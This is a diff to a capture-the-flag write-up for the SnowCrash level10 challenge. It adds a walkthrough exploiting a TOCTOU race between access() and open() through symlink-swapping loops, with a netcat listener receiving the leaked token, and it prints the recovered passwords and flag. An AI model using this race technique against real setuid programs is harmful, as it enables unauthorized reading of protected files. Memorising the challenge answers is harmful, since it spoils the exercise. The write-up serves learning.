@@ -50,5 +50,47 @@ NOTES
        then call open(2).)
 ```
 
-This issue creates what is called a Time-of-Check to Time-of-Use (TOCTOU) race condition. So, if we are able to swap 'token' with our exploit file in the lapsus of time between the successful call to 'access' and the call to 'open' we could have a chance to inject our exploit. This can be done replacing the 'token' file with a symbolic link to our exploit, tricking 'level10' into opening the wrong file.
+This issue creates what is called a Time-of-Check to Time-of-Use (TOCTOU) race condition. So, if we are able to swap 'token' with our exploit in this lapsus of time between the successful call to 'access' and the call to 'open' we could have a chance to inject our exploit. This can be done by replacing the 'token' file with a symbolic link to our exploit, tricking 'level10' into opening the wrong file.
 
+So, first of all let's create a fake token and let's try to connect with it to see the response.
+```bash
+level10@SnowCrash:~$ echo "This is a fake token" > /tmp/fake_token
+level10@SnowCrash:~$ ./level10 /tmp/fake_token localhost
+Connecting to localhost:6969 .. Unable to connect to host localhost
+```
+
+As expected it doesn't work but the response gives a clue about the port that the binary attempts to connect to, which will be important later. The next step is to run a line of code that will loop indefinitely, switching continuously between the real token and our fake token.
+```bash
+level10@SnowCrash:~$ while true; do ln -sf /tmp/fake_token /tmp/token_link; ln -sf ~/token /tmp/token_link; done
+```
+
+The terminal will be trapped in the infinite loop, so we need to open another one, to run the binary 'level10' with the symbolic link as argument and also inside an infinite loop.
+```bash
+level10@SnowCrash:~$ while true; do ./level10 /tmp/token_link 192.168.1.184; done
+```
+
+The 'level10' binary will eventually open our fake token file during the race condition. Since the binary sends the file contents to a host (as suggested by its usage message), we can use 'netcat' to capture the output. When the binary opens our fake token the text 'This is a fake token' will be printed. On the other hand when the race condition is successfully exploited, we obtain the content of the real token file.
+```bash
+level10@SnowCrash:~$ nc -lk 6969
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+This is a fake token
+.*( )*.
+woupa2yuojeeaaed06riuj63c
+.*( )*.
+This is a fake token
+.*( )*.
+```
+
+It seems that it worked, now we only need to obtain the flag.
+```bash
+level10@SnowCrash:~$ su flag10
+Password: 
+Don't forget to launch getflag !
+flag10@SnowCrash:~$ getflag
+Check flag.Here is your token : feulo4b72j7edeahuete3no7c
+flag10@SnowCrash:~$
+```
